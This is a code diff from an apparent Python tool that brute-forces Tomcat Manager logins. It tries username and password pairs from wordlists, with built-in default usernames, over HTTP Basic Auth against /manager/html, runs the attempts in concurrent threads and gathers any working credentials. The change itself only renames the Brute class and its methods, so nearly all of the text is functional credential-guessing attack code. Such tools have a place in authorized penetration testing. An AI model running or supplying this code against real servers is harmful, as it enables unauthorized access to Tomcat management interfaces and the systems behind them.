@@ -105,14 +105,14 @@ class output_class:
             self.message(state, description, clear_previous_line)
 
 
-# Brute force mode function
-class Brute:
+# Tomcat class
+class Tomcat:
     def __init__(self, url: str, userlist: str, wordlist: str):
         self.url = url
         self.userlist = userlist
         self.wordlist = wordlist
 
-    def brute_worker(self, username, password):
+    def login(self, username, password):
         auth = HTTPBasicAuth(username, password)
         response = requests.get(f"{self.url}/manager/html", auth=auth)
         if response.status_code == 200:
@@ -122,7 +122,7 @@ class Brute:
             output.verbose(state="failed", description=f"{username}:{password}", clear_previous_line=False)
             return None
 
-    def brute(self):
+    def brute_force(self):
         if self.userlist is None:
             self.userlist = common_username
         else:
@@ -139,7 +139,7 @@ class Brute:
             for username in self.userlist:
                 for password in passwords:
                     password = password.strip()
-                    task = executor.submit(self.brute_worker, username, password)
+                    task = executor.submit(self.login, username, password)
                     tasks.append(task)
 
             credentials = []
@@ -204,8 +204,8 @@ def main():
             else:
                 output.message("success", "Mode Brute selected", False)
 
-                brute_instance = Brute(args.url, args.userlist, args.wordlist)
-                credentials_found = brute_instance.brute()
+                tomcat_instance = Tomcat(args.url, args.userlist, args.wordlist)
+                credentials_found = tomcat_instance.brute_force()
 
                 if not credentials_found:
                     output.message("failed", f"No user or password is matching ! :(", False)
